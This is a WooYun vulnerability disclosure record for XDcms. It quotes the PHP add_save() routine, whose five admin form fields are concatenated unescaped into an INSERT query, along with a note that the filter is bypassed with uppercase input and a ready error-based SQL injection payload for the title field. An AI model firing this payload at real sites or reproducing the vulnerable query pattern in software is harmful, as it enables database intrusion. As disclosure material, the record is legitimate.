{"id": 58440, "wybug_id": "wooyun-2014-051254", "wybug_title": " XDcms Sql Injection 1-5", "wybug_corp": "www.xdcms.cn", "wybug_author": "HackBraid", "wybug_date": "2014-02-18 12:42", "wybug_open_date": "2014-05-19 12:43", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向公众公开  简要描述： SQL Injection 详细说明：  注入在XDCMS企业管理系统后台的内容发布处，\\system\\modules\\xdcms\\content.php文件：\npublic function add_save(){\t\t$title=safe_html($_POST['title']);//第一处注入title字段，safe_html为过滤规则集，可被大写绕过进行注入\t\t$commend=intval($_POST['commend']);\t\t$username=safe_html($_POST['username']);//第二处注入username，大写可绕过过滤\t\t$thumb=$_POST['thumb'];\t\t$keywords=safe_html($_POST['keywords']);//第三处注入，同上\t\t$description=safe_html($_POST['description']);//第四处注入，同上\t\t$inputtime=datetime();\t\t$updatetime=strtotime($_POST['updatetime']);\t\t$url=$_POST['url'];//第五处注入，没有safe_html过滤。\t\t$catid=intval($_POST['catid']);\t\t$userid=intval($_SESSION['admin_id']);\t\t$fields=$_POST['fields'];\t\t$style=$_POST['title_color'].\" \".$_POST['title_weight'];\t\t\t\tif(empty($title)||empty($catid)||empty($userid)||empty($updatetime)){\t\t\tshowmsg(C('material_not_complete'),'-1');\t\t}\t\t\t\t$model=modelname($catid);\t\t$model_content=get_content_table($model);\t\tif(empty($model)){\t\t\tshowmsg(C('error'),'-1');\t\t}\t\t\t\t$table=$this->mysql->show_table();   //判断数据表是否存在\t\tif(!in_array(DB_PRE.$model,$table)){\t\t\tshowmsg(C('table_not_exist'),'-1');\t\t}\t\t\t\t\t\t//添加content，sql语句，会将上边5个注入字段带入查询\t\t$sql=\"insert into \".DB_PRE.$model.\"(title,commend,username,thumb,keywords,description,inputtime,updatetime,url,catid,userid,hits,style) values('{$title}','{$commend}','{$username}','{$thumb}','{$keywords}','{$description}','{$inputtime}','{$updatetime}','{$url}','{$catid}','{$userid}',0,'{$style}')\";\t\t$this->mysql->query($sql);\t\t$last_id=$this->mysql->insert_id();\t\t\t\t//更新排序值\t\t$this->mysql->db_update($model,\"`sort`='\".$last_id.\"'\",\"`id`=\".$last_id);\t\t\t\t//添加附加表\t\t$sql_fields='`id`';\t\t$sql_value=$last_id;\t\t\t\tif(!empty($_POST['uploadtype'])){ //判断是否有多图上传\t\t\t$upload_array=$this->upload_more('morefile');\t\t\t$uploadtype=$_POST['uploadtype'];\t\t\t$fields[$uploadtype]=serialize(array_clear($upload_array));\t\t}\t\t\t\tforeach($fields as $key=>$value){\t\t\t$sql_fields.=\",`\".$key.\"`\";\t\t\tif(is_array($value)){\t\t\t\t$value_arr='';\t\t\t\tforeach($value as $k=>$v){\t\t\t\t\t$value_arr.=$v.',';\t\t\t\t}\t\t\t\t$value=$value_arr;\t\t\t}\t\t\t$sql_value.=\",'\".addslashes($value).\"'\";\t\t}\t\t\t\t$query=$this->mysql->query(\"insert into \".DB_PRE.$model_content.\"({$sql_fields}) values ({$sql_value})\");\t\tif(!$query){\t\t\t$this->mysql->db_delete($model,\"`id`=\".$last_id);\t\t\tshowmsg(C('insert_table_error'),'-1');\t\t}\t\t\t\t//生成静态\t\t$config=base::load_cache(\"cache_set_config\",\"_config\");\t\t$config_html=$config['createhtml'];    //取出系统配置缓存\t\t$array=get_category($catid);\t\t$ishtml=$array['is_html'];   //取出栏目是否设置生成html\t\t\t\tif(substr($url,0,7)!=\"http://\"){   //判断url是否为外链,如不是则更新url并生成内容html\t\t\t\t\t\tif($model=='single'){\t\t\t\t$url=$array['url'];    //如果是单页模型,url直接调用栏目url\t\t\t}else{\t\t\t\t$url=$this->ob_url->conurl($catid,$last_id,$ishtml,$inputtime);\t\t\t}\t\t\t$this->mysql->db_update($model,\"`url`='\".$url.\"'\",\"`id`=\".$last_id);                     //生成url并更新\t\t\t\t\t\tif($config_html==1&&$ishtml==1){\t\t\t\tif($model=='single'){\t\t\t\t\t$url=$url.\"index.html\";\t\t\t\t}\t\t\t\t$this->html->creat_show($catid,$last_id,$url,$array['lang']);   //生成内容html\t\t\t}\t\t}\t\t\t\tif($config_html==1&&$ishtml==1){\t\t\t\t$parent=is_parent($catid);\t\t\t\t$parent_id=explode(\",\",ltrim($parent,\",\"));\t\t\t\tif(count(array_filter($parent_id))!=0){    //判断是否有父类\t\t\t\t\tforeach($parent_id as $value){\t\t\t\t\t\t$parent_cat=get_category($value);   //取出父类栏目的url\t\t\t\t\t\t$this->html->creat_list($value,\"\",$parent_cat['url'].\"index.html\",$parent_cat['lang']);   //生成父栏目页\t\t\t\t\t\t$this->html->creat_list($catid,\"\",$array['url'].\"index.html\",$array['lang']);     //生成当前栏目页\t\t\t\t\t}\t\t\t\t}else{\t\t\t\t\t$this->html->creat_list($catid,\"\",$array['url'].\"index.html\",$array['lang']);   //如没有父类,生成列表页,减轻负担,默认只生成当前栏目第一页\t\t\t\t}\t\t}\t\t\t\tif($config_html==1){     //如果系统设置生成html则生成首页\t\t\t$lang=get_lang($array['lang']);\t\t\t$this->html->creat_index($array['lang'],$lang['dir']);\t\t}\t\tshowmsg(C('add_success'),'-1');\t}\n   漏洞证明：  以第一处title字段为例首先发布一个内容：\n\n上面的title字段插入exp\n' AND EXTRACTVALUE(7028,CONCAT(0x5c,0x7177786771,(SELECT (CASE WHEN (7028=7028) THEN 1 ELSE 0 END)),0x71706b6b71)) AND 'PAKz'='PAKz\n最后看看结果\n\n   修复方案：  过滤严格   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-02-24 22:25 厂商回复： 老版本没有更新 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}